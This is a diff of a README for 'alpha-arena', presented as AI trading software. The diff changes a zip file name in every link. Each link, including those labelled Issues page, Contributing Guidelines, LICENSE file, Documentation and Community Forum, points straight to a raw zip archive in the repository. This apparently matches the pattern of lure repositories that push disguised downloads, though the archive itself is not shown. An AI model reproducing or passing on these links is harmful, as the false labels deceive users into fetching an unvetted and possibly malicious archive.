@@ -10,7 +10,7 @@ To begin using alpha-arena, follow these simple steps to download and run the so
 ### Download Link
 You can download the latest version of alpha-arena from the Releases page:
 
-[![Download alpha-arena](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip)](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip)
+[![Download alpha-arena](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip)](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip)
 
 ### Steps to Download
 1. Click on the link above to visit the Releases page.
@@ -53,20 +53,20 @@ If you encounter issues while using alpha-arena, consider the following solution
 - **Performance Issues:** Close other applications to free up system resources.
 
 ## 📞 Support
-If you need further assistance, please visit the [GitHub Issues page](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip) or contact the support team. We are here to help you make the most out of your experience with alpha-arena.
+If you need further assistance, please visit the [GitHub Issues page](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip) or contact the support team. We are here to help you make the most out of your experience with alpha-arena.
 
 ## ✍️ Contribution
-The alpha-arena project welcomes contributions from the community. If you're interested in improving the platform, please check out our [Contributing Guidelines](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip).
+The alpha-arena project welcomes contributions from the community. If you're interested in improving the platform, please check out our [Contributing Guidelines](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip).
 
 ## 📝 License
-This project is licensed under the MIT License. For more details, see the [LICENSE file](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip).
+This project is licensed under the MIT License. For more details, see the [LICENSE file](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip).
 
 ## 🔗 Additional Resources
 For more information and updates, follow alpha-arena's official channels:
-- [Documentation](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip)
-- [Community Forum](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip)
+- [Community Forum](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip)
 
 ## 🌐 Download and Try It Now
 Ready to dive into AI trading? Download the latest version of alpha-arena now!
 
-[![Download alpha-arena](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip)](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha-arena-2.7-beta.2.zip)
+[![Download alpha-arena](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip)](https://raw.githubusercontent.com/hoangngaunhatthegioi/alpha-arena/main/core/alpha_arena_1.0.zip)
